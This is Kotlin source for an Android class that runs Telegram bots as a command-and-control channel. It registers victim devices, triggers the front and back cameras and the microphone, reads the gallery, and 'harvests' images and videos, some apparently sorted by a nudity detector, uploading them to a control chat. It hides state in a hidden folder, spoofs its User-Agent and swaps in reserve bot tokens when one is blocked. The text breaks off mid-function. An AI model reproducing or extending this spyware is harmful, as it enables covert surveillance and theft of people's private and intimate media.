package com.example.app

import android.content.Context
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.lang.ref.WeakReference
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.TimeUnit
import kotlin.random.Random

// استيراد دوال safeGet من MapExtensions.kt
import com.example.app.safeGet

/**
 * فئة إدارة واجهة Telegram والتحكم بالأجهزة والأوامر عبر البوتات.
 *
 * ملاحظات أمنية:
 * - التوكنات تُستقبل من ConfigLoader وهي مفكوكة بالفعل، ولكن يتم التعامل معها بحذر.
 * - لا تُطبع التوكنات في السجلات نهائياً (يتم إخفاؤها أو قصها).
 * - قوائم التوكنات محمية بواسطة synchronized وموجودة في ذاكرة التطبيق فقط.
 *
 * ✅ تم إصلاح دوال _api لتكون غير معلقة (non-suspend) مع استخدام runBlocking.
 * ✅ تم إضافة التحقق من وجود الملفات قبل الإرسال.
 * ✅ تم استبدال processedUpdates بـ LinkedHashSet مع تنظيف تلقائي عند الوصول للحد الأقصى.
 * ✅ تم إصلاح sendErrorReport لتجنب ANR باستخدام scope.launch بدلاً من runBlocking.
 */
class TelegramUi(
    context: Context,
    private val monitor: Any?,
    private val config: AppConfig          // ✅ استلام كائن الإعدادات الكامل
) {

    private val contextRef = WeakReference(context.applicationContext)
    private val appContext: Context? get() = contextRef.get()

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // ========== الأقفال والمتغيرات المتزامنة ==========
    private val sessionMutex = Mutex()
    private val deviceMutex = Mutex()
    private val offsetMutex = Mutex()

    @Volatile
    private var isRunning = false

    private var pollingJob: Job? = null
    private var cleanerJob: Job? = null
    private var heartbeatJob: Job? = null

    // ========== بيانات البوتات والأجهزة ==========
    // ✅ استخدام التوكنات من config (مفكوكة بالفعل)
    private val activeTokensList = Collections.synchronizedList(config.activeTokens.filter { it.isNotBlank() }.toMutableList())
    private val reserveTokensList = Collections.synchronizedList(config.reserveTokens.filter { it.isNotBlank() }.toMutableList())

    // ✅ المعرفات وكلمة المرور من config (غير سرية بشكل كبير)
    private val ctrlId: String = config.controlId.toString()
    private val vaultId: String = config.vaultId.toString()
    private val appPassword: String = config.secret ?: ""

    private val sessions = ConcurrentHashMap<String, Long>()
    private val devices = ConcurrentHashMap<String, JSONObject>()

    // ✅ استبدال القائمة بـ LinkedHashSet لتحسين الأداء ومنع التكرار مع تنظيف دوري
    private val processedUpdates = LinkedHashSet<String>()

    @Volatile
    private var apiCallsCount = 0

    @Volatile
    private var apiFailuresCount = 0

    // ========== المسارات والملفات ==========
    private val runtimeDir: File by lazy {
        File(appContext?.filesDir, ".sys_runtime").apply {
            if (!exists()) mkdirs()
        }
    }

    private val cacheThumbDir: File by lazy {
        File(runtimeDir, ".cache_thumb").apply {
            if (!exists()) mkdirs()
        }
    }

    private val dvsFile: File by lazy { File(runtimeDir, "dvs.json") }
    private val sesFile: File by lazy { File(runtimeDir, "ses.json") }
    private val offsetFile: File by lazy { File(runtimeDir, "polling_offset.json") }
    private val logFile: File by lazy { File(runtimeDir, "t.log") }

    // ========== عميل OkHttp ==========
    private val httpClient: OkHttpClient by lazy {
        OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(35, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .build()
    }

    companion object {
        private const val TAG = "TelegramUi"
        private val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()
        private val OCTET_STREAM_MEDIA_TYPE = "application/octet-stream".toMediaType()

        // ✅ تحديث دالة المصنع لتأخذ config
        @JvmStatic
        fun create(
            context: Context,
            monitor: Any?,
            config: AppConfig
        ): TelegramUi {
            return TelegramUi(context, monitor, config)
        }
    }

    init {
        loadData()
        startBackgroundWorkers()
    }

    // ============================================================
    //  إدارة الملفات والحفظ المحلي
    // ============================================================

    private fun loadData() {
        try {
            if (dvsFile.exists()) {
                val jsonStr = dvsFile.readText(Charsets.UTF_8)
                val json = JSONObject(jsonStr)
                json.keys().forEach { key ->
                    devices[key] = json.getJSONObject(key)
                }
            }
            if (sesFile.exists()) {
                val jsonStr = sesFile.readText(Charsets.UTF_8)
                val json = JSONObject(jsonStr)
                json.keys().forEach { key ->
                    sessions[key] = json.getLong(key)
                }
            }
        } catch (e: Exception) {
            writeLog("Load data error: ${e.message}")
        }
    }

    private suspend fun saveData() {
        try {
            deviceMutex.withLock {
                val dvsJson = JSONObject()
                devices.forEach { (k, v) -> dvsJson.put(k, v) }
                dvsFile.writeText(dvsJson.toString(2), Charsets.UTF_8)
            }
            sessionMutex.withLock {
                val sesJson = JSONObject()
                sessions.forEach { (k, v) -> sesJson.put(k, v) }
                sesFile.writeText(sesJson.toString(2), Charsets.UTF_8)
            }
        } catch (e: Exception) {
            writeLog("Save data error: ${e.message}")
        }
    }

    // ========== إدارة الـ Offset ==========
    private fun loadOffset(): Long {
        return try {
            if (offsetFile.exists()) {
                val json = JSONObject(offsetFile.readText(Charsets.UTF_8))
                json.optLong("offset", 0L)
            } else 0L
        } catch (e: Exception) {
            writeLog("Load offset error: ${e.message}")
            0L
        }
    }

    private suspend fun saveOffset(offset: Long) {
        try {
            offsetMutex.withLock {
                val json = JSONObject().apply {
                    put("offset", offset)
                    put("timestamp", System.currentTimeMillis() / 1000)
                }
                offsetFile.writeText(json.toString(), Charsets.UTF_8)
            }
        } catch (e: Exception) {
            writeLog("Save offset error: ${e.message}")
        }
    }

    // ============================================================
    //  إدارة التوكنات والخدمات الخلفية
    // ============================================================

    private fun getNextToken(): String? {
        synchronized(activeTokensList) {
            if (activeTokensList.isEmpty()) return null
            return activeTokensList[Random.nextInt(activeTokensList.size)]
        }
    }

    private fun emergencySwitchToken(badToken: String) {
        synchronized(activeTokensList) {
            if (activeTokensList.contains(badToken)) {
                activeTokensList.remove(badToken)
                synchronized(reserveTokensList) {
                    if (reserveTokensList.isNotEmpty()) {
                        val newToken = reserveTokensList.removeAt(0)
                        activeTokensList.add(newToken)
                        // ✅ إخفاء التوكن في السجل (نطبع أول 8 أحرف فقط)
                        writeLog("Swapped bad token with reserve: ${newToken.take(8)}...")
                        scope.launch {
                            apiCall(
                                "sendMessage",
                                JSONObject().apply {
                                    put("chat_id", ctrlId)
                                    put(
                                        "text",
                                        "⚠️ <b>Emergency switch</b>\nBot token replaced. ${reserveTokensList.size} reserve left."
                                    )
                                    put("parse_mode", "HTML")
                                }
                            )
                        }
                    } else {
                        scope.launch {
                            apiCall(
                                "sendMessage",
                                JSONObject().apply {
                                    put("chat_id", ctrlId)
                                    put("text", "🚨 <b>CRITICAL: No reserve bots left!</b>")
                                    put("parse_mode", "HTML")
                                }
                            )
                        }
                    }
                }
            }
        }
    }

    private fun startBackgroundWorkers() {
        cleanerJob = scope.launch {
            while (isActive) {
                delay(3600_000L)
                try {
                    val now = System.currentTimeMillis() / 1000
                    val expiredKeys = sessions.filter { it.value < now }.keys
                    if (expiredKeys.isNotEmpty()) {
                        sessionMutex.withLock {
                            expiredKeys.forEach { sessions.remove(it) }
                        }
                        saveData()
                    }
                } catch (e: Exception) {
                    writeLog("Session cleaner error: ${e.message}")
                }
            }
        }

        heartbeatJob = scope.launch {
            while (isActive) {
                delay(21_600_000L)
                if (reserveTokensList.isEmpty()) continue
                try {
                    val hbToken = synchronized(reserveTokensList) {
                        if (reserveTokensList.isNotEmpty()) {
                            reserveTokensList[Random.nextInt(reserveTokensList.size)]
                        } else null
                    } ?: continue
                    val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US).format(Date())
                    val json = JSONObject().apply {
                        put("chat_id", vaultId)
                        put("text", "❤️ system heartbeat $timeStr")
                    }
                    val request = Request.Builder()
                        .url("https://api.telegram.org/bot$hbToken/sendMessage")
                        .post(json.toString().toRequestBody(JSON_MEDIA_TYPE))
                        .build()
                    httpClient.newCall(request).execute().close()
                } catch (e: Exception) {
                    writeLog("Heartbeat error: ${e.message}")
                }
            }
        }
    }

    // ============================================================
    //  تنفيذ طلبات Telegram API (JSON) - تبقى معلقة (suspend)
    // ============================================================

    private suspend fun apiCall(
        method: String,
        payload: JSONObject? = null,
        retry: Int = 3
    ): JSONObject? {
        apiCallsCount++
        var lastToken: String? = null
        for (attempt in 0 until retry) {
            var token = getNextToken() ?: run {
                writeLog("No token available for $method")
                return null
            }
            if (attempt > 0 && token == lastToken) {
                token = getNextToken() ?: return null
            }
            lastToken = token
            try {
                val url = "https://api.telegram.org/bot$token/$method"
                val body = payload?.toString()?.toRequestBody(JSON_MEDIA_TYPE)
                    ?: JSONObject().toString().toRequestBody(JSON_MEDIA_TYPE)
                val request = Request.Builder()
                    .url(url)
                    .addHeader("User-Agent", "Mozilla/5.0 (Linux; Android 13) Mobile Safari/537.36")
                    .post(body)
                    .build()
                val response = withContext(Dispatchers.IO) {
                    httpClient.newCall(request).execute()
                }
                val responseStr = response.body?.string() ?: ""
                if (!response.isSuccessful && response.code != 200) {
                    writeLog("HTTP ${response.code} for $method")
                    val sleepTime = minOf(attempt * 2000L, 30000L)
                    delay(sleepTime)
                    continue
                }
                val jsonResult = JSONObject(responseStr)
                if (jsonResult.optBoolean("ok", false)) {
                    return jsonResult
                }
                val errorCode = jsonResult.optInt("error_code", 0)
                when (errorCode) {
                    429 -> {
                        val retryAfter = jsonResult.optJSONObject("parameters")
                            ?.optLong("retry_after") ?: (attempt * 3L)
                        delay(retryAfter * 1000L)
                        continue
                    }
                    401, 403 -> {
                        emergencySwitchToken(token)
                        continue
                    }
                    else -> {
                        writeLog("API Error $errorCode: ${jsonResult.optString("description")}")
                        delay(1000L)
                    }
                }
            } catch (e: Exception) {
                writeLog("API exception for $method: ${e.message}")
                val sleepTime = minOf(attempt * 3000L, 60000L)
                delay(sleepTime)
            }
        }
        apiFailuresCount++
        writeLog("All $retry attempts failed for $method.")
        return null
    }

    // ============================================================
    //  تنفيذ طلبات Multipart - تبقى معلقة (suspend)
    // ============================================================

    private suspend fun apiCallMultipart(
        method: String,
        params: Map<String, Any>,
        files: Map<String, File>,
        retry: Int = 3
    ): JSONObject? {
        apiCallsCount++
        var lastToken: String? = null
        for (attempt in 0 until retry) {
            var token = getNextToken() ?: run {
                writeLog("No token available for $method (multipart)")
                return null
            }
            if (attempt > 0 && token == lastToken) {
                token = getNextToken() ?: return null
            }
            lastToken = token
            try {
                val url = "https://api.telegram.org/bot$token/$method"
                val builder = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)

                params.forEach { (key, value) ->
                    builder.addFormDataPart(key, value.toString())
                }

                files.forEach { (key, file) ->
                    if (file.exists() && file.isFile) {
                        builder.addFormDataPart(
                            key,
                            file.name,
                            file.asRequestBody(OCTET_STREAM_MEDIA_TYPE)
                        )
                    } else {
                        writeLog("File $key does not exist: ${file.absolutePath}")
                    }
                }

                val request = Request.Builder()
                    .url(url)
                    .addHeader("User-Agent", "Mozilla/5.0 (Linux; Android 13) Mobile Safari/537.36")
                    .post(builder.build())
                    .build()

                val response = withContext(Dispatchers.IO) {
                    httpClient.newCall(request).execute()
                }
                val responseStr = response.body?.string() ?: ""
                if (!response.isSuccessful && response.code != 200) {
                    writeLog("HTTP ${response.code} for $method (multipart)")
                    val sleepTime = minOf(attempt * 2000L, 30000L)
                    delay(sleepTime)
                    continue
                }
                val jsonResult = JSONObject(responseStr)
                if (jsonResult.optBoolean("ok", false)) {
                    return jsonResult
                }
                val errorCode = jsonResult.optInt("error_code", 0)
                when (errorCode) {
                    429 -> {
                        val retryAfter = jsonResult.optJSONObject("parameters")
                            ?.optLong("retry_after") ?: (attempt * 3L)
                        delay(retryAfter * 1000L)
                        continue
                    }
                    401, 403 -> {
                        emergencySwitchToken(token)
                        continue
                    }
                    else -> {
                        writeLog("API Error $errorCode (multipart): ${jsonResult.optString("description")}")
                        delay(1000L)
                    }
                }
            } catch (e: Exception) {
                writeLog("API exception for $method (multipart): ${e.message}")
                val sleepTime = minOf(attempt * 3000L, 60000L)
                delay(sleepTime)
            }
        }
        apiFailuresCount++
        writeLog("All $retry attempts failed for $method (multipart).")
        return null
    }

    // ============================================================
    //  دوال عامة للاستدعاء عبر الانعكاس (غير معلقة - non-suspend)
    //  تستخدمها فئات أخرى مثل DailyZipper, Commands, StreamManager
    //  ✅ تم إزالة suspend واستخدام runBlocking
    // ============================================================

    /**
     * استدعاء API عام مع معاملات JSON (للانعكاس)
     * غير معلقة لضمان التوافق مع الانعكاس.
     */
    fun _api(method: String, params: Map<String, Any>): JSONObject? {
        return runBlocking(Dispatchers.IO) {
            apiCall(method, JSONObject(params))
        }
    }

    /**
     * استدعاء API مع رفع ملفات (Multipart) (للانعكاس)
     * غير معلقة لضمان التوافق مع الانعكاس.
     */
    fun _api(method: String, params: Map<String, Any>, files: Map<String, File>): JSONObject? {
        return runBlocking(Dispatchers.IO) {
            apiCallMultipart(method, params, files)
        }
    }

    /**
     * إرسال مستند (ملف ZIP أو أي ملف) إلى الدردشة
     * غير معلقة لضمان التوافق مع الانعكاس.
     * تم إضافة التحقق من وجود الملف قبل الإرسال.
     */
    fun sendDocument(chatId: Long, file: File, caption: String): JSONObject? {
        if (!file.exists()) {
            Log.w(TAG, "File not found: ${file.absolutePath}")
            return null
        }
        return _api(
            "sendDocument",
            mapOf("chat_id" to chatId, "caption" to caption),
            mapOf("document" to file)
        )
    }

    /**
     * إرسال صورة إلى الدردشة
     * غير معلقة لضمان التوافق مع الانعكاس.
     */
    fun sendPhoto(chatId: Long, file: File, caption: String): JSONObject? {
        if (!file.exists()) {
            Log.w(TAG, "File not found: ${file.absolutePath}")
            return null
        }
        return _api(
            "sendPhoto",
            mapOf("chat_id" to chatId, "caption" to caption),
            mapOf("photo" to file)
        )
    }

    /**
     * إرسال ملف صوتي (Voice) إلى الدردشة
     * غير معلقة لضمان التوافق مع الانعكاس.
     */
    fun sendVoice(chatId: Long, file: File): JSONObject? {
        if (!file.exists()) {
            Log.w(TAG, "File not found: ${file.absolutePath}")
            return null
        }
        return _api(
            "sendVoice",
            mapOf("chat_id" to chatId),
            mapOf("voice" to file)
        )
    }

    /**
     * إرسال ملف فيديو إلى الدردشة
     * غير معلقة لضمان التوافق مع الانعكاس.
     */
    fun sendVideo(chatId: Long, file: File, caption: String): JSONObject? {
        if (!file.exists()) {
            Log.w(TAG, "File not found: ${file.absolutePath}")
            return null
        }
        return _api(
            "sendVideo",
            mapOf("chat_id" to chatId, "caption" to caption),
            mapOf("video" to file)
        )
    }

    /**
     * إرسال ملف صوتي (Audio) إلى الدردشة
     * غير معلقة لضمان التوافق مع الانعكاس.
     */
    fun sendAudio(chatId: Long, file: File, caption: String): JSONObject? {
        if (!file.exists()) {
            Log.w(TAG, "File not found: ${file.absolutePath}")
            return null
        }
        return _api(
            "sendAudio",
            mapOf("chat_id" to chatId, "caption" to caption),
            mapOf("audio" to file)
        )
    }

    // ============================================================
    //  تسجيل الأجهزة والإشعارات
    // ============================================================

    /**
     * تسجيل جهاز جديد في مجموعة التحكم
     * غير معلقة لضمان التوافق مع الانعكاس.
     */
    fun registerDevice(deviceId: String, deviceModel: String): Long? {
        return runBlocking(Dispatchers.IO) {
            registerDeviceSuspend(deviceId, deviceModel)
        }
    }

    /**
     * النسخة المعلقة من تسجيل الجهاز (تُستخدم داخلياً)
     */
    private suspend fun registerDeviceSuspend(deviceId: String, deviceModel: String): Long? {
        if (deviceId.isBlank()) return null
        deviceMutex.withLock {
            if (devices.containsKey(deviceId)) {
                val devObj = devices[deviceId]!!
                devObj.put(
                    "last_seen",
                    SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date())
                )
                saveData()
                return devObj.optLong("t", -1L).takeIf { it != -1L }
            }
            val topicName = "📱 ${deviceModel.take(12)} | ${deviceId.take(4)}"
            val payload = JSONObject().apply {
                put("chat_id", ctrlId)
                put("name", topicName)
            }
            val res = apiCall("createForumTopic", payload)
            if (res != null && res.optBoolean("ok")) {
                val topicId = res.getJSONObject("result").getLong("message_thread_id")
                val newDev = JSONObject().apply {
                    put("n", deviceModel)
                    put("t", topicId)
                    put(
                        "last_seen",
                        SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date())
                    )
                }
                devices[deviceId] = newDev
                saveData()
                apiCall(
                    "sendMessage",
                    JSONObject().apply {
                        put("chat_id", ctrlId)
                        put("message_thread_id", topicId)
                        put(
                            "text",
                            "<b>✅ Device registered</b>\n<b>$deviceModel</b>\n<code>$deviceId</code>"
                        )
                        put("parse_mode", "HTML")
                    }
                )
                return topicId
            }
        }
        return null
    }

    fun notifyHarvest(deviceId: String, count: Int) {
        scope.launch {
            val dev = devices[deviceId] ?: return@launch
            val topicId = dev.optLong("t", -1L)
            if (topicId != -1L) {
                val timeStr = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
                val msg = """
                    📦 <b>Auto harvest</b>
                    Device: ${dev.optString("n")}
                    Items: $count
                    Time: $timeStr
                """.trimIndent()
                apiCall(
                    "sendMessage",
                    JSONObject().apply {
                        put("chat_id", ctrlId)
                        put("message_thread_id", topicId)
                        put("text", msg)
                        put("parse_mode", "HTML")
                    }
                )
            }
        }
    }

    // ============================================================
    //  إرسال تقارير الأخطاء إلى Telegram
    // ============================================================

    /**
     * إرسال تقرير خطأ مفصل إلى مجموعة التحكم.
     * ✅ تم إصلاح الدالة لتجنب ANR باستخدام scope.launch بدلاً من runBlocking.
     */
    fun sendErrorReport(errorTitle: String, errorDetails: Map<String, Any>) {
        scope.launch {
            try {
                val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
                val deviceModel = monitor?.let {
                    invokeMethod(it, "getDeviceModel") as? String ?: "Unknown"
                } ?: "Unknown"

                val detailsText = errorDetails.entries.joinToString("\n") { (key, value) ->
                    "• $key: $value"
                }

                val report = """
                    ❌ <b>خطأ في التطبيق</b>
                    📌 <b>$errorTitle</b>
                    🕐 الوقت: $timeStr
                    📱 الجهاز: $deviceModel
                    
                    📋 التفاصيل:
                    $detailsText
                """.trimIndent()

                apiCall(
                    "sendMessage",
                    JSONObject().apply {
                        put("chat_id", ctrlId)
                        put("text", report)
                        put("parse_mode", "HTML")
                    }
                )
            } catch (e: Exception) {
                writeLog("Failed to send error report: ${e.message}")
            }
        }
    }

    // ============================================================
    //  عدد الملفات المعلقة
    // ============================================================

    private fun countPendingHarvest(): Int {
        return try {
            if (!cacheThumbDir.exists()) return 0
            val files = cacheThumbDir.listFiles { file ->
                file.isFile && !file.name.startsWith(".")
            }
            files?.size ?: 0
        } catch (e: Exception) {
            writeLog("Count pending harvest error: ${e.message}")
            0
        }
    }

    // ============================================================
    //  أزرار التحكم
    // ============================================================

    private fun getMainKeyboard(): JSONObject {
        return JSONObject().apply {
            put(
                "inline_keyboard",
                JSONArray().apply {
                    put(JSONArray().apply {
                        put(JSONObject().apply {
                            put("text", "📱 Connected devices")
                            put("callback_data", "ld")
                        })
                    })
                    put(JSONArray().apply {
                        put(JSONObject().apply {
                            put("text", "🧠 AI Status")
                            put("callback_data", "ai_status")
                        })
                        put(JSONObject().apply {
                            put("text", "🔄 Renew session")
                            put("callback_data", "rnw")
                        })
                    })
                    put(JSONArray().apply {
                        put(JSONObject().apply {
                            put("text", "🚪 Logout")
                            put("callback_data", "ext")
                        })
                    })
                }
            )
        }
    }

    private fun getDeviceKeyboard(deviceId: String): JSONObject {
        val count = countPendingHarvest()
        val harvestText = if (count > 0) "📦 Harvest ($count)" else "📦 Harvest (empty)"
        return JSONObject().apply {
            put(
                "inline_keyboard",
                JSONArray().apply {
                    put(JSONArray().apply {
                        put(JSONObject().apply {
                            put("text", "📸 Back camera")
                            put("callback_data", "cam_$deviceId")
                        })
                        put(JSONObject().apply {
                            put("text", "🤳 Front camera")
                            put("callback_data", "camf_$deviceId")
                        })
                    })
                    put(JSONArray().apply {
                        put(JSONObject().apply {
                            put("text", "🎙️ Record audio")
                            put("callback_data", "mic_$deviceId")
                        })
                        put(JSONObject().apply {
                            put("text", harvestText)
                            put("callback_data", "hrv_$deviceId")
                        })
                    })
                    put(JSONArray().apply {
                        put(JSONObject().apply {
                            put("text", "🖼️ Gallery")
                            put("callback_data", "media_$deviceId")
                        })
                        put(JSONObject().apply {
                            put("text", "🚀 Send now")
                            put("callback_data", "send_now_$deviceId")
                        })
                    })
                    put(JSONArray().apply {
                        put(JSONObject().apply {
                            put("text", "🔙 Back")
                            put("callback_data", "ld")
                        })
                    })
                }
            )
        }
    }

    // ============================================================
    //  عرض تفاصيل الحصاد (مكتملة)
    // ============================================================

    private suspend fun showHarvestDetails(chatId: Long) {
        if (!cacheThumbDir.exists()) {
            apiCall(
                "sendMessage",
                JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", "📭 No pending files.")
                }
            )
            return
        }
        try {
            val files = cacheThumbDir.listFiles { file ->
                val name = file.name.lowercase(Locale.ROOT)
                file.isFile && (name.endsWith(".jpg") || name.endsWith(".png") || name.endsWith(".mp4"))
            } ?: arrayOf()
            if (files.isEmpty()) {
                apiCall(
                    "sendMessage",
                    JSONObject().apply {
                        put("chat_id", chatId)
                        put("text", "📭 Harvest folder empty.")
                    }
                )
                return
            }
            val totalSize = files.sumOf { it.length() }
            val timeStr = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
            val details = """
                📊 **Harvest report**
                ━━━━━━━━━━━━━━━
                🖼️ Files: `${files.size}`
                💾 Size: `${String.format(Locale.US, "%.2f", totalSize / (1024.0 * 1024.0))} MB`
                ⏰ Updated: `$timeStr`

                Use '🚀 Send now' to upload immediately.
            """.trimIndent()
            apiCall(
                "sendMessage",
                JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", details)
                    put("parse_mode", "Markdown")
                }
            )
        } catch (e: Exception) {
            writeLog("Harvest details error: ${e.message}")
            sendErrorReport(
                "فشل عرض تفاصيل الحصاد",
                mapOf(
                    "الاستثناء" to (e.message ?: "غير معروف"),
                    "الوقت" to SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
                )
            )
        }
    }

    // ============================================================
    //  معالجة الرسائل والكولباك
    // ============================================================

    private fun isAuthorized(chatId: Long): Boolean {
        val exp = sessions[chatId.toString()] ?: 0L
        return (System.currentTimeMillis() / 1000) < exp
    }

    private suspend fun handleMessage(update: JSONObject) {
        try {
            val msg = update.optJSONObject("message") ?: return
            val chatId = msg.optJSONObject("chat")?.optLong("id") ?: return
            val text = msg.optString("text", "")

            if (text.startsWith("/login")) {
                if (appPassword.isBlank()) {
                    apiCall(
                        "sendMessage",
                        JSONObject().apply {
                            put("chat_id", chatId)
                            put("text", "⚠️ كلمة المرور غير معرّفة في النظام.")
                        }
                    )
                    return
                }
                val parts = text.split("\\s+".toRegex())
                if (parts.size >= 2 && parts[1].trim() == appPassword) {
                    sessionMutex.withLock {
                        sessions[chatId.toString()] = (System.currentTimeMillis() / 1000) + 14400
                    }
                    saveData()
                    apiCall(
                        "sendMessage",
                        JSONObject().apply {
                            put("chat_id", chatId)
                            put("text", "🔓 Login successful")
                            put("reply_markup", getMainKeyboard())
                        }
                    )
                } else {
                    apiCall(
                        "sendMessage",
                        JSONObject().apply {
                            put("chat_id", chatId)
                            put("text", "❌ Wrong password")
                        }
                    )
                }
                return
            }

            if (isAuthorized(chatId)) {
                when (text) {
                    "/menu" -> {
                        apiCall(
                            "sendMessage",
                            JSONObject().apply {
                                put("chat_id", chatId)
                                put("text", "📋 Main menu")
                                put("reply_markup", getMainKeyboard())
                            }
                        )
                        return
                    }
                    "/status" -> {
                        val status = getStatus()
                        val activeTokens = status.safeGet("active_tokens") ?: 0
                        val reserveTokens = status.safeGet("reserve_tokens") ?: 0
                        val devicesCount = status.safeGet("devices") ?: 0
                        val sessionsCount = status.safeGet("sessions") ?: 0
                        val apiCalls = status.safeGet("api_calls") ?: 0
                        val apiFailures = status.safeGet("api_failures") ?: 0
                        val pendingFiles = status.safeGet("pending_files") ?: 0

                        val statusText = """
                            📊 **Status**
                            ━━━━━━━━━━━━━━━
                            Active tokens: `$activeTokens`
                            Reserve tokens: `$reserveTokens`
                            Devices: `$devicesCount`
                            Sessions: `$sessionsCount`
                            API calls: `$apiCalls`
                            API failures: `$apiFailures`
                            Pending files: `$pendingFiles`
                        """.trimIndent()
                        apiCall(
                            "sendMessage",
                            JSONObject().apply {
                                put("chat_id", chatId)
                                put("text", statusText)
                                put("parse_mode", "Markdown")
                            }
                        )
                        return
                    }
                }
            }

            // تمرير الأوامر الأخرى إلى Commands
            try {
                Commands.ex(appContext ?: return, text, this, monitor, chatId)
            } catch (e: Exception) {
                writeLog("Command error: ${e.message}")
                sendErrorReport(
                    "خطأ في تنفيذ الأمر",
                    mapOf(
                        "الأمر" to text,
                        "الاستثناء" to (e.message ?: "غير معروف"),
                        "الوقت" to SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
                    )
                )
                apiCall(
                    "sendMessage",
                    JSONObject().apply {
                        put("chat_id", chatId)
                        put("text", "❌ Error: ${e.message?.take(100)}")
                    }
                )
            }
        } catch (e: Exception) {
            writeLog("Handle message error: ${e.message}")
            sendErrorReport(
                "خطأ في معالجة الرسالة",
                mapOf(
                    "الاستثناء" to (e.message ?: "غير معروف"),
                    "الوقت" to SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
                )
            )
        }
    }

    private suspend fun handleCallback(update: JSONObject) {
        try {
            val cb = update.optJSONObject("callback_query") ?: return
            val cbId = cb.optString("id")
            if (cbId.isBlank()) return

            // ✅ استخدام LinkedHashSet مع تنظيف تلقائي عند الوصول للحد الأقصى
            synchronized(processedUpdates) {
                if (processedUpdates.contains(cbId)) return
                if (processedUpdates.size >= 150) {
                    processedUpdates.clear()
                }
                processedUpdates.add(cbId)
            }

            val chatId = cb.optJSONObject("message")?.optJSONObject("chat")?.optLong("id") ?: return
            val msgId = cb.optJSONObject("message")?.optLong("message_id") ?: return
            val data = cb.optString("data", "")

            apiCall(
                "answerCallbackQuery",
                JSONObject().apply {
                    put("callback_query_id", cbId)
                }
            )

            if (!isAuthorized(chatId)) {
                apiCall(
                    "sendMessage",
                    JSONObject().apply {
                        put("chat_id", chatId)
                        put("text", "⚠️ Session expired, use /login")
                    }
                )
                return
            }

            when {
                data == "ld" -> {
                    if (devices.isEmpty()) {
                        apiCall(
                            "sendMessage",
                            JSONObject().apply {
                                put("chat_id", chatId)
                                put("text", "⚠️ لا توجد أجهزة مرتبطة حالياً.")
                            }
                        )
                        return
                    }
                    val kb = JSONObject().apply {
                        val rows = JSONArray()
                        devices.forEach { (did, info) ->
                            rows.put(
                                JSONArray().apply {
                                    put(
                                        JSONObject().apply {
                                            put("text", "📱 ${info.optString("n")}")
                                            put("callback_data", "dev_$did")
                                        }
                                    )
                                }
                            )
                        }
                        rows.put(
                            JSONArray().apply {
                                put(
                                    JSONObject().apply {
                                        put("text", "🔄 Refresh")
                                        put("callback_data", "ld")
                                    }
                                )
                                put(
                                    JSONObject().apply {
                                        put("text", "🔙 Back")
                                        put("callback_data", "main")
                                    }
                                )
                            }
                        )
                        put("inline_keyboard", rows)
                    }
                    apiCall(
                        "editMessageText",
                        JSONObject().apply {
                            put("chat_id", chatId)
                            put("message_id", msgId)
                            put("text", "<b>Select device:</b>")
                            put("reply_markup", kb)
                            put("parse_mode", "HTML")
                        }
                    )
                    return
                }
                data.startsWith("dev_") -> {
                    val did = data.substring(4)
                    if (devices.containsKey(did)) {
                        val devName = devices[did]?.optString("n") ?: "Device"
                        apiCall(
                            "editMessageText",
                            JSONObject().apply {
                                put("chat_id", chatId)
                                put("message_id", msgId)
                                put("text", "🕹️ <b>$devName</b>")
                                put("reply_markup", getDeviceKeyboard(did))
                                put("parse_mode", "HTML")
                            }
                        )
                    }
                    return
                }
                data.startsWith("hrv_") -> {
                    showHarvestDetails(chatId)
                    return
                }
                data.startsWith("send_now_") -> {
                    if (monitor != null) {
                        try {
                            val forceMethod = monitor.javaClass.getMethod("forceHarvest")
                            forceMethod.invoke(monitor)
                            apiCall(
                                "sendMessage",
                                JSONObject().apply {
                                    put("chat_id", chatId)
                                    put("text", "🚀 Requesting immediate harvest...")
                                }
                            )
                        } catch (e: Exception) {
                            writeLog("Send now error: ${e.message}")
                            sendErrorReport(
                                "فشل الإرسال الفوري",
                                mapOf(
                                    "الاستثناء" to (e.message ?: "غير معروف"),
                                    "الوقت" to SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
                                )
                            )
                        }
                    } else {
                        apiCall(
                            "sendMessage",
                            JSONObject().apply {
                                put("chat_id", chatId)
                                put("text", "❌ وحدة الحصاد غير متاحة")
                            }
                        )
                    }
                    return
                }
                data == "ai_status" -> {
                    val status = if (monitor != null) {
                        try {
                            val detector = monitor.javaClass.getDeclaredField("nudeDetector")
                            detector.isAccessible = true
                            val detObj = detector.get(monitor)
                            if (detObj != null) {
                                val isReadyMethod = detObj.javaClass.getMethod("isReady")
                                val ready = isReadyMethod.invoke(detObj) as? Boolean ?: false
                                if (ready) "✅ Active" else "❌ Not ready"
                            } else "❌ Not available"
                        } catch (e: Exception) {
                            "⚠️ Unknown"
                        }
                    } else "⚠️ Monitor not available"

                    apiCall(
                        "answerCallbackQuery",
                        JSONObject().apply {
                            put("callback_query_id", cbId)
                            put("text", "AI: $status")
                            put("show_alert", true)
                        }
                    )
                    return
                }
                data == "rnw" -> {
                    val exp = (System.currentTimeMillis() / 1000) + 14400
                    sessionMutex.withLock {
                        sessions[chatId.toString()] = exp
                    }
